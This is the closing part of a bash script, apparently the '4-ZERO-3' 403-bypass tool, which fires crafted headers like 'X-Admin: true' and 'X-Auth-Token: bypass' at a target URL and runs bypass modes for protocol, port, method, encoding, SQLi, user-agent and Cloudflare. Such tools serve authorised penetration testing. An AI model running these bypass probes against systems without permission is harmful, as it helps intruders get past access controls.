  code=$(do_curl -H "X-Internal-Request: true" "${target}")
  print_result "X-Internal-Request: true" "$(box "curl -ks -H 'X-Internal-Request: true' '${target}'")"

  code=$(do_curl -H "X-Service-ID: internal" "${target}")
  print_result "X-Service-ID: internal" "$(box "curl -ks -H 'X-Service-ID: internal' '${target}'")"

  code=$(do_curl -H "X-Auth-Token: bypass" "${target}")
  print_result "X-Auth-Token: bypass" "$(box "curl -ks -H 'X-Auth-Token: bypass' '${target}'")"

  code=$(do_curl -H "X-Admin: true" "${target}")
  print_result "X-Admin: true" "$(box "curl -ks -H 'X-Admin: true' '${target}'")"

  code=$(do_curl -H "X-Debug: 1" "${target}")
  print_result "X-Debug: 1" "$(box "curl -ks -H 'X-Debug: 1' '${target}'")"
}

# ════════════════════════════════════════════════════════════════
# MAIN RUNNER
# ════════════════════════════════════════════════════════════════
function all_bypass(){
  Header_Bypass
  Protocol_Bypass
  Port_Bypass
  HTTP_Method_Bypass
  URL_Encode_Bypass
  SQLi_libinjection
  UserAgent_Bypass
  Cloudflare_Bypass
  API_Bypass
}

function summary(){
  echo ""
  echo -e "${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}"
  echo -e "${bold}  Summary${end}"
  echo -e "${blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${end}"
  echo -e "  Total checks : ${bold}${bypass_count}${end}"
  if [[ $hit_count -gt 0 ]]; then
    echo -e "  Potential hits: ${bold}${green}${hit_count}${end}"
    echo -e "  ${yellow}⚠  Verify Content-Length on all 2xx — identical lengths = false positive${end}"
  else
    echo -e "  Hits          : ${red}0${end}"
  fi
  [[ -n "$output_file" ]] && echo -e "  Log saved to  : ${cyan}${output_file}${end}"
  echo ""
}

function prg(){
  set +u
  while [[ $# -gt 0 ]]; do
    case $1 in
      '-u'|'--url')
        target="$2"
        path=$(echo "$2" | cut -d "/" -f4-)
        domain=$(echo "$2" | cut -d "/" -f3)
        shift 2
        ;;
      '--header')   mode='header';    shift ;;
      '--protocol') mode='proto';     shift ;;
      '--port')     mode='port';      shift ;;
      '--HTTPmethod') mode='HTTPmethod'; shift ;;
      '--encode')   mode='encode';    shift ;;
      '--exploit')  mode='exploit';   shift ;;
      '--SQLi')     mode='sqli';      shift ;;
      '--useragent') mode='useragent'; shift ;;
      '--cloudflare') mode='cloudflare'; shift ;;
      '--api')      mode='api';       shift ;;
      '--delay')    delay="$2";       shift 2 ;;
      '--output')   output_file="$2"; shift 2 ;;
      '--hits-only') log_only_hits=true; shift ;;
      '-h'|'--help') usage; exit 0 ;;
      *) echo -e "${red}[!] Unknown option: $1${end}"; usage; exit 1 ;;
    esac
  done

  if [[ -z "${target}" ]]; then
    printf "\n${red}[!]${end} ${yellow}No URL/PATH provided.${end}\n\n"
    usage; exit 1
  fi
  if [[ -z "${mode}" ]]; then
    printf "\n${red}[!]${end} ${yellow}No mode specified.${end}\n\n"
    usage; exit 1
  fi

  [[ -n "$output_file" ]] && {
    echo "# 4-ZERO-3 2026 — Scan: ${target} — $(date)" > "$output_file"
  }

  banner

  case "${mode}" in
    'header')     Header_Bypass ;;
    'proto')      Protocol_Bypass ;;
    'port')       Port_Bypass ;;
    'HTTPmethod') HTTP_Method_Bypass ;;
    'encode')     URL_Encode_Bypass ;;
    'sqli')       SQLi_libinjection ;;
    'useragent')  UserAgent_Bypass ;;
    'cloudflare') Cloudflare_Bypass ;;
    'api')        API_Bypass ;;
    'exploit')    all_bypass ;;
  esac

  summary
}

prg "$@"
tput sgr0
